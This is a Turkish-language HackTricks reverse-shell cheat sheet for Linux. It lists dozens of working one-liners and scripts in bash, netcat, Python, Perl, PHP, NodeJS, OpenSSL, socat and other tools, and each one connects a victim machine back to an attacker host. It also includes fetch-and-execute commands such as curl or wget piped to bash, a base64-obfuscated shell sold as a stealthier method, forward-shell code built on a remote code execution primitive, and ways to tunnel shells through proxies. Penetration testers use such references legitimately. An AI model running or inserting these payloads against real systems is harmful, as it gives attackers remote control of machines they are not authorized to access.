# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**Bu shell'lerden herhangi biriyle ilgili sorularınız varsa bunları** [**https://explainshell.com/**](https://explainshell.com/) **üzerinden kontrol edebilirsiniz.**<sup>[[9]](#references)</sup>

## Full TTY

**Bir reverse shell elde ettikten sonra**[ **full TTY edinmek için bu sayfayı okuyun**](full-ttys.md)**.**

Aşağıda derlenen temel reverse-shell payload'ları HighOn.Coffee ve PayloadsAllTheThings cheat sheet'lerinde de belgelenmiştir; birini seçmeden önce hedefte ilgili interpreter ve utility'lerin kullanılabilir olduğunu doğrulayın.<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

Diğer shell'leri de kontrol etmeyi unutmayın: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh ve bash.

### Sembol güvenli shell

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```

#### Shell açıklaması

Aşağıdaki maddeler, Bash'in belgelenmiş etkileşimli ve yönlendirme davranışlarını özetler:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: Komutun bu bölümü etkileşimli (`-i`) bir Bash shell başlatır.
2. **`>&`**: Komutun bu bölümü, **standart çıktıyı** (`stdout`) ve **standart hatayı** (`stderr`) **aynı hedefe yönlendirmek** için kullanılan kısa gösterimdir.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Bu, **belirtilen IP adresi ve porta TCP bağlantısını temsil eden** özel bir dosyadır.
   - **Çıktı ve hata akışlarını bu dosyaya yönlendirerek** komut, etkileşimli shell oturumunun çıktısını saldırganın makinesine gönderir.
4. **`0>&1`**: Komutun bu bölümü, **standart girişi (`stdin`), standart çıktıyla (`stdout`) aynı hedefe yönlendirir**.

### Dosyada oluştur ve çalıştır

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

## Forward Shell

RCE kullanılabilir olduğunda ancak reverse shell bir firewall, NAT veya outbound filtering tarafından engellendiğinde, RCE channel üzerinden bir forward shell yarı etkileşimli bir oturum sağlayabilir.<sup>[[12]](#references)</sup>

Bu amaç için önerilen araç, bir command-execution primitive'ini etkileşimli bir oturumda sarmalayan [toboggan](https://github.com/n3rada/toboggan.git) aracıdır.<sup>[[12]](#references)</sup>

toboggan kullanmak için hedef sisteminizin RCE bağlamına uygun bir Python modülü oluşturun; modül arayüzü, komut çıktısını döndüren bir `execute(command, timeout)` işlevi bekler.<sup>[[12]](#references)</sup> Örneğin `nix.py` adlı bir modül şu şekilde yapılandırılabilir:

```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
    token = jwt.encode(
        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
    )

    response = httpx.get(
        url="https://vulnerable.io:3200",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
        # ||BURP||
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    return response.text
```

Modülü toboggan'ın mevcut komut satırı sözdizimiyle çalıştırın:<sup>[[12]](#references)</sup>

```shell
toboggan nix.py
```

Bu, etkileşimli oturumu başlatır. Yerleşik Burp Suite backend'i için `toboggan --request burp_request.xml`; command-wrapper backend'i için `toboggan --exec-wrapper '<command_template>'` kullanın.<sup>[[12]](#references)</sup>

Bir diğer seçenek de `IppSec` forward-shell uygulamasıdır [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>

Aşağıdaki kısımları değiştirmeniz gerekir:<sup>[[13]](#references)</sup>

- Savunmasız host'un URL'si
- Payload'unuzun öneki ve son eki (varsa)
- Payload'un gönderilme yöntemi (headers? data? ek bilgi?)

Ardından **komut gönderebilir** veya tam bir PTY elde etmek için **`upgrade` komutunu** kullanabilirsiniz; uygulama çıktıyı yaklaşık 1,3 saniyelik aralıklarla kontrol eder.<sup>[[13]](#references)</sup>

## Netcat

```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## BusyBox

BusyBox birçok aracı tek bir küçük çalıştırılabilir dosyada birleştirir ve küçük ya da gömülü Linux sistemlerinde yaygındır. Bağımsız bir `nc` yoksa BusyBox'ın bunu sunup sunmadığını kontrol edin:<sup>[[8]](#references)[[19]](#references)</sup>

```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```

`busybox nc` mevcutsa ancak etkileşimli çalıştırma güvenilir değilse, `nc` bölümündeki FIFO kalıbını bu applet'e uyarlayın:<sup>[[2]](#references)[[8]](#references)</sup>

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```

## gsocket

Resmî dağıtım talimatlarını [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) adresinden kontrol edin.<sup>[[14]](#references)</sup>

```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```

## Telnet

```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## Whois

**Saldırgan**

```bash
while true; do nc -l <port>; done
```

Whois bölümünde açıklanan aynı Enter/CTRL+D giriş dizisini kullanın.<sup>[[3]](#references)</sup>

**Kurban**

```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```

## Python

```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## Perl

```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PHP

```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Ncat

```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```

### Açıkça belirtilmiş bir dışa giden proxy üzerinden

Hedef HTTP `CONNECT` veya SOCKS proxy'sine erişebiliyor ancak dinleyiciye doğrudan TCP bağlantısı açamıyorsa, bağlantı modunda **Ncat** kullanın. Proxy, dinleyicinin ana bilgisayarına ve portuna tünel açılmasına izin vermelidir; `CONNECT` yalnızca kurulumdan sonra baytları iletir, bu nedenle düz bir shell, HTTP proxy kullandığı için **HTTP trafiği değildir** ve şifrelenmez.<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>

```bash
# Attacker: expose a listener reachable from the proxy
ncat -l 443

# Target: HTTP CONNECT proxy (default proxy type)
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <ATTACKER_HOST> 443

# Target: use this instead for a SOCKS5 proxy
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
```

Kimlik doğrulamalı bir proxy için Ncat, `--proxy-auth` veya `NCAT_PROXY_AUTH` seçeneğini kabul eder (ikincisi, kimlik bilgilerini komut argümanlarına yazmaktan kaçınmanızı sağlar).<sup>[[23]](#references)</sup> Hedef ana bilgisayar adları varsayılan olarak proxy tarafından çözümlenir; yerel çözümleme gerekiyorsa yalnızca `--proxy-dns local` kullanın.<sup>[[23]](#references)</sup> Proxy, `CONNECT` dışında TLS veya uygulama protokolleri gerektiriyorsa 443 numaralı portun ham bir shell'i gizlediğini varsaymak yerine uygun bir şifreli taşıma yöntemi kullanın; WebSocket tabanlı taşıma için [tunneling and port forwarding](../tunneling-and-port-forwarding.md) sayfasına bakın.<sup>[[22]](#references)[[24]](#references)</sup>

## Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Lua

```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

## Zsh (yerleşik TCP)

```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```

## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust ile yazılmış modern netcat benzeri dinleyici.<sup>[[5]](#references)</sup>

```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
  && chmod +x /tmp/rcat \
  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```

Proje tarafından belgelenen özellikler:<sup>[[5]](#references)</sup>
- Interactive mode'da command history ve tab completion
- `connect` tarafından kullanılan shell executable'ını seçmek için `-s`

## pwncat-cs

Elinizde zaten **herhangi bir ham reverse shell** varsa ancak daha kullanışlı bir session kurabilen bir listener istiyorsanız, `pwncat-cs` bağlantıyı yönetebilir ve uzaktaki bir PTY'yi kullanmayı deneyebilir.<sup>[[7]](#references)</sup>

```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

Ayrıca **şifrelenmiş** `ssl-bind` ve `ssl-connect` kanallarını da destekler; böylece aktarım şifrelemesi gerektiğinde `ncat --ssl` veya `socat OPENSSL:` payload'larıyla birlikte kullanabilirsiniz.<sup>[[7]](#references)</sup>

## revsh (şifrelenmiş ve pivoting'e hazır)

`revsh`, **şifrelenmiş bir Diffie-Hellman tüneli** üzerinden tam bir TTY sağlayan ve ters VPN benzeri pivoting için isteğe bağlı olarak bir **TUN/TAP** arayüzü bağlayabilen küçük bir C istemci/sunucusudur.<sup>[[6]](#references)</sup>

```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```

`revsh` tarafından belgelenen kullanışlı flag'ler şunlardır:<sup>[[6]](#references)</sup>
- `-b`: bind-shell modu (her iki uçta da etkinleştirin)
- `-D [LHOST:]LPORT` veya `-B [RHOST:]RPORT`: dinamik SOCKS 4/4a/5 yönlendirmesi
- `-x`: varsayılan TUN/TAP kurulumu da dahil olmak üzere proxy'lerin otomatik yapılandırılmasını devre dışı bırakır

Şifrelenmiş tünel, shell trafiğinin düz metin olarak açığa çıkmasını önler; ancak tek başına ağ politikasını aşmaz.<sup>[[6]](#references)</sup>

## OpenSSL

Bu bölümde, bir sertifika oluşturmak ve TLS üzerinden shell taşımak için OpenSSL'in `req`, `s_server` ve `s_client` komutları kullanılır.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

Saldırgan (Kali)

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

Kurban

```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```

Ayrı input/output kanalları istediğinizde klasik **two-listener** pattern'ini hâlâ kullanabilirsiniz.<sup>[[16]](#references)[[17]](#references)</sup>

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Finger

**Saldırgan**

```bash
while true; do nc -l 79; done
```

Komutu göndermek için yazın, Enter'a basın ve STDIN'i durdurmak için CTRL+D'ye basın.<sup>[[3]](#references)</sup>

**Kurban**

```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```

## Gawk

```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Xterm

Bu, sisteminize 6001 numaralı porttan bağlanmayı dener.<sup>[[2]](#references)</sup>

```bash
xterm -display 10.0.0.1:1
```

Reverse shell'i yakalamak için aşağıda gösterildiği gibi 6001 portunu dinleyen bir X server kullanın.<sup>[[2]](#references)</sup>

```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```

## Groovy

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). NOT: Java reverse shell, Groovy için de çalışır.<sup>[[18]](#references)</sup>

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## References

- [1] [Reverse Shell Başvuru Rehberi: PHP, ASP, Netcat, Bash ve Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Reverse Shell Başvuru Rehberi](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Reverse Shell için Whois ve Finger Kullanımı](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Reverse Shell Başvuru Rehberi](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - Modern port dinleyicisi ve reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - Terminal desteği, veri tünelleme ve gelişmiş pivotlama özelliklerine sahip reverse shell](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - post-exploitation platformu](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Bash Başvuru Kılavuzu: Yönlendirmeler](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Bash Başvuru Kılavuzu: Bash'i Çalıştırma](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Global Socket dağıtım yönergeleri](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Saf Groovy/Java Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
- [20] [Ncat ile Proxy Kullanımı](https://nmap.org/ncat/guide/ncat-proxy.html)
- [21] [Ncat ile Komut Çalıştırma](https://nmap.org/ncat/guide/ncat-exec.html)
- [22] [RFC 9110: CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
- [23] [Ncat Başvuru Kılavuzu](https://nmap.org/book/ncat-man.html)
- [24] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../../banners/hacktricks-training.md}}
